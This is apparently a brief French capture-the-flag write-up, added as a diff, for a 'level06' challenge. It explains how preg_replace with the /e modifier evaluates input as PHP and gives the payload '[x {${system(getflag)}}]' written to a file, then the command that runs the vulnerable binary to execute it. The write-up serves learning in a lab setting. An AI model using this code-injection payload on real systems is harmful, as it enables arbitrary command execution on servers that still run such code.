@@ -1,0 +1,16 @@
+On a level06.php et son executable, 
+level05 prend en parametre un fichier et parse le contenu
+
+Faille:
+
+$a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a);
+
+le parametre /e dans preg_replace fait en sorte que
+la string qui suit soit interpretee comme du php
+on met donc dans le fichier que l'on veut envoyer:
+
+echo '[x {${system(getflag)}}]' > /dev/shm/getflag.txt
+./level06 /dev/shm/getflag.txt
+
+le parsing envoie dans y ce qu'il y a apres x dans [x ...]
+et donc system(getflag) est execute, donnant le flag
